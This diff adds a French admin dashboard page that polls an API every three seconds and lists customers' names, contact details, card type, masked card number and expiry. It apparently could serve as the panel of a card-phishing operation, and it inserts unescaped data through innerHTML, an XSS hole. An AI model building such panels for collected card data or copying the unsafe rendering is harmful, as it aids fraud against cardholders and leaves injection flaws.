@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Admin - Gestion Clients</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #f2f2f2;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+        }
+        
+        th,
+        td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        
+        th {
+            background: #0070ba;
+            color: #fff;
+        }
+        
+        .small {
+            font-size: 0.9rem;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Tableau de bord Admin</h1>
+    <p class="small">Les données sont récupérées depuis Firestore via les fonctions serverless.</p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Nom complet</th>
+                <th>Email</th>
+                <th>Téléphone</th>
+                <th>Type carte</th>
+                <th>Numéro (masqué)</th>
+                <th>Expiration</th>
+                <th>Reçu le</th>
+            </tr>
+        </thead>
+        <tbody id="clientsBody"></tbody>
+    </table>
+
+    <script>
+        async function loadClients() {
+            try {
+                const res = await fetch("/api/all");
+                const clients = await res.json();
+                const tbody = document.getElementById("clientsBody");
+                tbody.innerHTML = "";
+
+                clients.forEach(c => {
+                    tbody.innerHTML += `
+            <tr>
+              <td>${c.fullName || ""}</td>
+              <td>${c.email || ""}</td>
+              <td>${c.phone || ""}</td>
+              <td>${c.cardType || ""}</td>
+              <td>${c.masked || ""}</td>
+              <td>${c.expiryDate || ""}</td>
+              <td>${new Date(c.timestamp).toLocaleString()}</td>
+            </tr>
+          `;
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        // rafraîchit toutes les 3s
+        loadClients();
+        setInterval(loadClients, 3000);
+    </script>
+</body>
+
+</html>
